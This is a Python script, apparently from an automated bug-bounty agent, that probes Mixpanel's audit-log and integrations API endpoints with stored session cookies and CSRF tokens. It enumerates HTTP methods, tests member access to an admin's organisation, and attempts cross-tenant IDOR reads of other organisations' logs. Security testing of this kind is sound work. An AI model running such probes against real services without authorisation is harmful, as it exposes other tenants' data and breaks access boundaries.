#!/usr/bin/env python3
"""Full method-enum + cross-role + cross-tenant probes on audit-logs/integrations."""
import sys, os, json, time
sys.path.insert(0, '/home/hunter/new_agent/.claude/lib')
from safe_http import SafeHttp

sh = SafeHttp(allow_raw_for_waf=True)

TARGET = 'mixpanel'
tokens = json.load(open(f'/home/hunter/new_agent/targets/{TARGET}/recon/tokens.json'))
ADMIN  = tokens['ADMIN']
MEMBER = tokens['MEMBER']
IDOR   = tokens['IDOR']

LOG_PATH = f'/home/hunter/new_agent/targets/{TARGET}/notes/session-log.md'
def log(msg):
    with open(LOG_PATH, 'a') as f:
        f.write(f"[{time.strftime('%H:%M:%S')}] AUDIT-LOG: {msg}\n")

def headers_for(role_dict):
    return {
        "Cookie": role_dict['full_cookies'],
        "X-CSRFToken": role_dict['csrf'],
        "Authorization": "Session",
        "Referer": "https://mixpanel.com/",
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Content-Type": "application/json",
    }

BASE = "https://mixpanel.com"
ROLE_MAP = {"ADMIN": ADMIN, "MEMBER": MEMBER, "IDOR": IDOR}

results = []

def record(label, method, path, role, status, ctype, allow, body_first, req_body=None):
    snippet = body_first[:600] if body_first else ""
    rec = {
        "label": label,
        "method": method,
        "path": path,
        "role": role,
        "status": status,
        "content_type": ctype,
        "allow_header": allow,
        "body_first_600": snippet,
        "req_body": req_body,
    }
    results.append(rec)
    log(f"{label} | {method} {path} as {role} -> {status} | Allow={allow} | CT={ctype} | body={snippet[:140]}")

def call(method, path, role, body=None, extra_headers=None, label="enum"):
    role_dict = ROLE_MAP[role] if isinstance(role, str) else role
    h = headers_for(role_dict)
    if extra_headers:
        h.update(extra_headers)
    url = BASE + path
    try:
        if body is not None:
            resp = sh.request(method, url, headers=h, json_body=body, timeout=20)
        else:
            resp = sh.request(method, url, headers=h, timeout=20)
        status = resp.status_code
        ctype = resp.headers.get("Content-Type", "")
        allow = resp.headers.get("Allow", resp.headers.get("allow", ""))
        text = resp.text or ""
        record(label, method, path, role, status, ctype, allow, text, req_body=body)
        return status, allow, text
    except Exception as e:
        record(label, method, path, role, -1, "", "", f"ERR:{e}", req_body=body)
        return -1, "", str(e)

# === A. Method enumeration with ADMIN (fixed json_body) ===
log("=== PHASE A: ADMIN method enum (fixed) ===")
ENDPOINTS = [
    "/api/app/organizations/3100781/audit-logs",
    "/api/app/projects/4025923/audit-logs",
    "/api/app/projects/4025923/integrations",
]
for P in ENDPOINTS:
    call("POST",  P, "ADMIN", body={}, label="A-POST-empty")
    call("POST",  P, "ADMIN", body={"start_date":"2026-05-01","end_date":"2026-05-30","limit":10}, label="A-POST-range")
    call("PUT",   P, "ADMIN", body={"start_date":"2026-05-01","end_date":"2026-05-30","limit":10}, label="A-PUT")
    call("PATCH", P, "ADMIN", body={"start_date":"2026-05-01","end_date":"2026-05-30","limit":10}, label="A-PATCH")

# === B. POST as MEMBER (no perms in org 3100781) on the same endpoints ===
log("=== PHASE B: MEMBER POST on ADMIN's org/project ===")
for P in ENDPOINTS:
    call("POST", P, "MEMBER", body={}, label="B-MEMBER-empty")
    call("POST", P, "MEMBER", body={"start_date":"2026-05-01","end_date":"2026-05-30","limit":10}, label="B-MEMBER-range")

# === B2. Cross-tenant: ADMIN trying to read IDOR's org (3100795) ===
log("=== PHASE B2: ADMIN -> IDOR org (3100795) ===")
call("POST", "/api/app/organizations/3100795/audit-logs", "ADMIN",
     body={"start_date":"2026-05-01","end_date":"2026-05-30","limit":10}, label="B2-ADMIN->IDORorg")

# === D. MEMBER on own org (3100810) for baseline; then cross to others ===
log("=== PHASE D: MEMBER lateral ===")
call("POST", "/api/app/organizations/3100810/audit-logs", "MEMBER",
     body={"start_date":"2026-05-01","end_date":"2026-05-30","limit":10}, label="D-MEMBER-own")
call("POST", "/api/app/organizations/3100795/audit-logs", "MEMBER",
     body={"start_date":"2026-05-01","end_date":"2026-05-30","limit":10}, label="D-MEMBER->IDORorg")

# === E. integrations POST body variants ===
log("=== PHASE E: integrations body variants ===")
PINT = "/api/app/projects/4025923/integrations"
for role in ("ADMIN", "MEMBER"):
    call("POST", PINT, role, body={}, label=f"E-{role}-empty")
    call("POST", PINT, role, body={"type":"webhook"}, label=f"E-{role}-webhook")
    call("POST", PINT, role, body={"action":"list"}, label=f"E-{role}-action-list")

# Save before phase F so we can decide
ts = int(time.time())
out = f"/home/hunter/new_agent/results/mixpanel/audit-log-phasesABDE-{ts}.json"
with open(out, 'w') as f:
    json.dump(results, f, indent=2)
print(f"SAVED {out} records={len(results)}")
log(f"Saved {out} records={len(results)}")
